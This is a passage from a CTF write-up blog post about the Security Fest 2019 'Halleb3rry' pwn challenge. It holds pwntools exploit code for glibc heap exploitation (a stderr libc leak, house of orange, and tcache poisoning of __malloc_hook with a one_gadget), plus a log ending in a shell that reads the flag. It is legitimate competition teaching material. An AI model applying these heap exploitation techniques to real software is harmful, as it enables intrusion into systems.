    000005e0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"CCC</span><span class="se">\x00\x31</span><span class="s">"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mi">96</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>

<p>So, finally we have our libc leak… But as well, we’re out of <code class="language-plaintext highlighter-rouge">free</code>, since we freed already 5 times to get here.</p>

<p>Might have been a bad idea, that I totally ignored the possible <code class="language-plaintext highlighter-rouge">double free</code> in my exploit. Maybe this would have helped to get this done with a less amount of frees, but well, there I was, a libc leak at hand and only armed with a <code class="language-plaintext highlighter-rouge">stderr</code> chunk and nothing to free anymore :(</p>

<p>Well, if the binary won’t help me triggering <code class="language-plaintext highlighter-rouge">free</code> anymore, we have to force it.</p>

<p>We still can allocate as many chunks as we like, so it’s time for <code class="language-plaintext highlighter-rouge">house of orange</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger free via house of orange"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">29</span><span class="p">):</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
	
<span class="c1"># Overwrite top
</span><span class="n">write_off</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">))</span>
	
<span class="c1"># Allocate to trigger free of top chunk
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span></code></pre></figure>

<p>This will result in freeing the top chunk and putting it into <code class="language-plaintext highlighter-rouge">tcache arena</code>.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000251
0x603010:	0x0000fe0001000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000604fa0  &lt;= freed top chunk
0x603070:	0x0000000000000000	0x00000000fbad2086
0x603080:	0x0000000000000000	0x0000000000000000</code></pre></figure>

<p>But still not enough to do something useful with it, we need another chunk behind it, that is also freed.</p>

<p>Let’s just do it again :)</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger second free"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">27</span><span class="p">):</span>
	<span class="n">alloc</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>

<span class="c1"># Overwrite top
</span><span class="n">write_off</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">))</span>

<span class="c1"># Allocate to trigger free of top chunk
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000251
0x603010:	0x0000fe0001000001	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000624fd0	0x0000000000000000  &lt;= second freed top chunk
0x603060:	0x0000000000000000	0x0000000000604fa0  &lt;= first freed top chunk
0x603070:	0x0000000000000000	0x00000000fbad2086</code></pre></figure>

<p>Two freed chunks in <code class="language-plaintext highlighter-rouge">tcache arena</code> again, this might finally come to an end :)</p>

<p>All that’s left now, is to allocate the first freed chunk, overwrite the <code class="language-plaintext highlighter-rouge">FD</code> of the second freed chunk with <code class="language-plaintext highlighter-rouge">__malloc_hook</code> and overwrite it with a <code class="language-plaintext highlighter-rouge">one_gadget</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Get previous free chunk"</span><span class="p">)</span>	
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite FD of second chunk with __malloc_hook"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">])</span>

<span class="n">write_off</span><span class="p">(</span><span class="mh">0x20030</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate chunks to overwrite __malloc_hook with one_gadget"</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mh">0x20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x4f322</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate another chunk to trigger one_gadget"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"100"</span><span class="p">)</span></code></pre></figure>

<p>One last thing to note: When writing the exploit, I ran the binary directly from the script, which resulted in the final exploit not working remotely, since the size of the buffer chunk will vary. You can get around this by running the binary in <code class="language-plaintext highlighter-rouge">socat</code> and connect to it locally, like you would do remote, which will help in fixing the offsets of the chunks.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
[*] '/media/sf_ctf/secfest/halleberry/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to halleb3rry-01.pwn.beer on port 6666: Done
[*] Create fake chunk and free it to get main_arena ptr on heap
[*] Setup some chunks and overwrite freed FD pointing to stdout pointer
[*] Allocate chunk to get stderr pointer into bin list
[*] Allocate chunk inside stderr
[*] Overwrite _IO_write_ptr
[*] LIBC leak : 0x7f945a12cca0
[*] LIBC      : 0x7f9459d41000
[*] Trigger free via house of orange
[*] Trigger second free
[*] Get previous free chunk
[*] Overwrite FD of second chunk with __malloc_hook
[*] Allocate chunks to overwrite __malloc_hook with one_gadget
[*] Allocate another chunk to trigger one_gadget
[*] Switching to interactive mode
[?] size: $ ls
flag
libc.so.6
pwn
start.sh
$ cat flag
sctf{tcache_1s_s0_secure_doubl3_fr33_and_std0ut_lolz}</code></pre></figure>

<p>Still feels, like I overcomplicated this one, so I’m curious to see other writeups :)</p>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=Security Fest 2019 - Halleb3rry&amp;url=https://kileak.github.io/ctf/2019/secfest-halleb3rry/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/secfest-halleb3rry/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2019/secfest-halleb3rry';
        var disqus_title = 'Security Fest 2019 - Halleb3rry';
        var disqus_url = 'https://kileak.github.io/ctf/2019/secfest-halleb3rry';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
